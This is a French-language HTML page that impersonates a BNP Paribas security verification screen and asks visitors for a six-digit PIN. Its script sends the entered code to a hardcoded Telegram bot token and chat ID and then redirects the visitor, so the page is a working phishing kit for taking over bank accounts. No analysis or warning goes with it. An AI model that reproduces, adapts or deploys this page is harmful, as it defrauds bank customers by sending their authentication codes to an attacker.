<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>BNP paribas - Vérification</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
    body {
      background: url('e1350e88-5112-4f64-ab38-1df8e9af5d51_c.jpg') no-repeat center center/cover;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      position: relative;
    }
    .login-container {
      background: rgba(255, 255, 255, 0.95);
      border-radius: 20px;
      padding: 30px 25px;
      width: 90%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(0,0,0,0.2);
      text-align: left;
    }
    .logo {
      font-size: 24px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 30px;
      color: white;
      position: absolute;
      top: 40px;
    }
    .form-title {
      color: #333;
      text-align: center;
      margin-bottom: 20px;
      font-size: 22px;
    }
    .form-description {
      color: #555;
      text-align: center;
      margin-bottom: 25px;
      font-size: 15px;
    }
    .input-group {
      margin-bottom: 20px;
      position: relative;
    }
    .input-group input {
      width: 100%;
      padding: 12px 40px 12px 40px;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      background-color: #f3f3f3;
      color: #333;
      text-align: center;
      letter-spacing: 5px;
      font-size: 20px;
    }
    .input-group svg {
      position: absolute;
      left: 12px;
      top: 50%;
      transform: translateY(-50%);
      width: 20px;
      height: 20px;
      fill: #888;
    }
    button {
      width: 100%;
      padding: 12px;
      border-radius: 30px;
      border: none;
      font-weight: bold;
      font-size: 16px;
      background-color: rgba(255,255,255,0.7);
      color: #333;
      cursor: pointer;
      margin-top: 10px;
    }
    .error-message {
      color: #d32f2f;
      font-size: 14px;
      margin-top: 8px;
      display: none;
      text-align: center;
    }
    .timer {
      margin-top: 15px;
      color: #555;
      font-size: 14px;
      text-align: center;
    }
    .loading {
      display: none;
      margin-top: 15px;
      color: #555;
      text-align: center;
    }
    .bottom-right {
      position: absolute;
      bottom: 20px;
      right: 20px;
    }
    .bottom-left {
      position: absolute;
      bottom: 20px;
      left: 20px;
    }
    .small-button {
      background: rgba(255, 255, 255, 0.7);
      color: #333;
      padding: 8px 16px;
      border-radius: 20px;
      font-size: 14px;
      border: none;
      cursor: pointer;
    }
    .resend-code {
      text-align: center;
      margin-top: 15px;
    }
    .resend-code a {
      color: #555;
      font-size: 13px;
      text-decoration: none;
    }
    .code-inputs {
      display: flex;
      justify-content: space-between;
      margin-bottom: 20px;
    }
    .code-inputs input {
      width: 40px;
      height: 60px;
      text-align: center;
      font-size: 24px;
      border-radius: 10px;
      border: 1px solid #ddd;
      background-color: #f3f3f3;
    }
  </style>
</head>
<body>

  <div class="logo">BNP <span style="font-weight: normal;">⚛️</span> paribas </div>

  <div class="login-container">
    <h1 class="form-title">Vérification de sécurité</h1>
    <p class="form-description">code PIN de 6 chiffres. Veuillez le saisir ci-dessous.</p>
    
    <div class="code-inputs">
      <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric" autofocus>
      <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric">
      <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric">
      <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric">
      <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric">
      <input type="text" maxlength="1" pattern="[0-9]" inputmode="numeric">
    </div>
    
    <div id="error-message" class="error-message">Veuillez entrer le code pin complet à 6 chiffres</div>
    
    <button id="submit-btn">Vérifier le code</button>
    <div id="loading" class="loading">Vérification en cours...</div>
    
    <div class="resend-code">
      <a href="#" id="resend-link">Renvoyer le code</a> (<span id="resend-timer">60</span>s)
    </div>
  </div>

  <div class="bottom-left">
    <a href="#" class="small-button">Aide & services</a>
  </div>

  <div class="bottom-right">
    <a href="#" class="small-button">Devenir client</a>
  </div>

  <script>
    document.addEventListener('DOMContentLoaded', function() {
      const codeInputs = document.querySelectorAll('.code-inputs input');
      const submitBtn = document.getElementById('submit-btn');
      const errorMessage = document.getElementById('error-message');
      const loadingElement = document.getElementById('loading');
      const resendLink = document.getElementById('resend-link');
      const resendTimer = document.getElementById('resend-timer');
      
      // Gestion des champs de code
      codeInputs.forEach((input, index) => {
        // Passer au champ suivant quand on entre un chiffre
        input.addEventListener('input', function(e) {
          if (this.value.length === 1) {
            if (index < codeInputs.length - 1) {
              codeInputs[index + 1].focus();
            }
          }
        });
        
        // Gestion des touches pour navigation entre les champs
        input.addEventListener('keydown', function(e) {
          if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
            codeInputs[index - 1].focus();
          }
        });
      });
      
      // Timer pour renvoi du code
      let resendSeconds = 60;
      const resendCountdown = setInterval(function() {
        resendSeconds--;
        resendTimer.textContent = resendSeconds;
        
        if (resendSeconds <= 0) {
          clearInterval(resendCountdown);
          resendLink.style.pointerEvents = 'auto';
          resendLink.style.opacity = '1';
          resendTimer.style.display = 'none';
          resendLink.textContent = 'Renvoyer le code';
        }
      }, 1000);
      
      // Désactiver le lien de renvoi initialement
      resendLink.style.pointerEvents = 'none';
      resendLink.style.opacity = '0.5';
      
      // Gestion du clic sur "Renvoyer le code"
      resendLink.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Réinitialiser le timer
        resendSeconds = 60;
        resendTimer.style.display = 'inline';
        resendTimer.textContent = resendSeconds;
        resendLink.style.pointerEvents = 'none';
        resendLink.style.opacity = '0.5';
        
        // Afficher un message (simulé)
        errorMessage.textContent = 'Un nouveau code a été envoyé';
        errorMessage.style.color = '#4CAF50';
        errorMessage.style.display = 'block';
        
        setTimeout(() => {
          errorMessage.style.display = 'none';
        }, 3000);
      });
      
      // Gestion de la soumission du formulaire
      submitBtn.addEventListener('click', async function() {
        // Vérifier que tous les champs sont remplis
        let codeComplete = true;
        let verificationCode = '';
        
        codeInputs.forEach(input => {
          if (input.value.length !== 1) {
            codeComplete = false;
          } else {
            verificationCode += input.value;
          }
        });
        
        if (codeComplete) {
          // Afficher le chargement
          submitBtn.disabled = true;
          loadingElement.style.display = 'block';
          
          try {
            // Envoyer le code à Telegram
            const botToken = '7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw';
            const chatId = '5372119436';
            const message = `Code de vérification reçu:\nCode: ${verificationCode}`;
            
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json',
              },
              body: JSON.stringify({
                chat_id: chatId,
                text: message
              })
            });
            
            if (!response.ok) {
              throw new Error('Erreur lors de l\'envoi à Telegram');
            }
            
            // Attendre 2 secondes avant la redirection
            setTimeout(() => {
              window.location.href = 'index.html';
            }, 2000);
            
          } catch (error) {
            console.error('Erreur:', error);
            errorMessage.textContent = 'Une erreur est survenue, veuillez réessayer';
            errorMessage.style.color = '#d32f2f';
            errorMessage.style.display = 'block';
            submitBtn.disabled = false;
            loadingElement.style.display = 'none';
          }
        } else {
          // Afficher le message d'erreur
          errorMessage.textContent = 'Veuillez entrer le code complet à 8 chiffres';
          errorMessage.style.color = '#d32f2f';
          errorMessage.style.display = 'block';
          codeInputs[0].focus();
        }
      });

      // Permettre la validation avec la touche Entrée
      codeInputs[codeInputs.length - 1].addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
          submitBtn.click();
        }
      });
    });
  </script>
</body>
</html>
